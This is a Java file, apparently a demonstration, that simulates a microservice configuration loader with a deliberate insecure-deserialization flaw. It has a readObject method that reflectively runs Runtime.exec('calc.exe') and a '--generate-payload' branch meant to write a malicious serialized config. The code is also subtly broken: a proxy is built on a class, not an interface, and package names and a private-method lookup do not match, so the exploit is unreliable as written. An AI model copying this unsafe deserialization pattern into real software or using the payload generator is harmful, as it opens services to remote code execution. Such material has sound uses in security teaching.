import java.io.*;
import java.lang.reflect.*;
import java.util.*;

// 模拟微服务配置中心
interface ConfigLoader {
    Object loadConfig(String path);
}

// 存在漏洞的配置处理器
class VulnerableConfigHandler implements ConfigLoader {
    public Object loadConfig(String path) {
        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(path))) {
            // 使用元编程动态加载配置类
            Class<?> configClass = Class.forName("com.example.ConfigModel");
            return ois.readObject(); // 不安全的反序列化
        } catch (Exception e) {
            return null;
        }
    }
}

// 模拟微服务配置模型
// 注意：真实场景中该类可能来自共享库，但攻击者可构造恶意子类
class ConfigModel implements Serializable {
    private String dbUrl;
    private transient String secretKey; // 敏感字段

    public ConfigModel() {
        // 模拟元编程反射调用
        try {
            Method method = this.getClass().getMethod("initSecretKey");
            method.invoke(this);
        } catch (Exception e) {
            // 忽略异常处理
        }
    }

    private void initSecretKey() {
        // 模拟敏感信息初始化
        secretKey = "REAL_SECRET_123!@#";
    }

    // 恶意构造的readObject方法
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        // 触发元编程反射攻击
        try {
            Class<?> clazz = Class.forName("java.lang.Runtime");
            Method execMethod = clazz.getMethod("exec", String.class);
            execMethod.invoke(Runtime.getRuntime(), "calc.exe"); // 模拟命令执行
        } catch (Exception e) {
            // 静默失败
        }
    }
}

// 模拟微服务启动类
public class CloudService {
    public static void main(String[] args) {
        ConfigLoader loader = new VulnerableConfigHandler();
        
        // 模拟攻击者构造的恶意配置
        if (args.length > 0 && args[0].equals("--generate-payload")) {
            try (ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("malicious.config"))) {
                // 使用动态代理创建恶意对象
                Object maliciousObj = Proxy.newProxyInstance(
                    CloudService.class.getClassLoader(),
                    new Class<?>[]{Class.forName("com.example.ConfigModel")},
                    (proxy, method, methodArgs) -> {
                        if (method.getName().equals("initSecretKey")) {
                            // 植入恶意逻辑
                            Runtime.getRuntime().exec("calc.exe");
                        }
                        return null;
                    }
                );
                oos.writeObject(maliciousObj);
            } catch (Exception e) {
                e.printStackTrace();
            }
        } else {
            // 正常服务启动，加载配置
            Object config = loader.loadConfig("malicious.config");
            System.out.println("[INFO] Config loaded: " + (config != null ? "Success" : "Failed"));
        }
    }
}